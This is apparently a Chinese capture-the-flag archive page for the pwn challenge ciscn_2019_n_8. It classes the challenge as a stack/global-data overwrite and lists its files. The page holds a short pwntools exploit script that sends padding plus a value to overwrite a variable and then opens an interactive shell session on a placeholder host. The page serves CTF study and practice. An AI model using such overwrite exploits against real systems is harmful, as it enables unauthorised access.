# 知识点

栈

# 题目分析

全局数据覆盖题按本仓库三类目录约定并入栈目录，具体原理见附件与脚本。

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [ciscn_2019_n_8](ciscn_2019_n_8)
- [ciscn_2019_n_8.py](ciscn_2019_n_8.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [ciscn_2019_n_8.py](ciscn_2019_n_8.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import*
#io=process('./ciscn_2019_n_8')
io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
padding=b'a'*52+p32(0x11)
io.sendline(padding)
io.interactive()
```
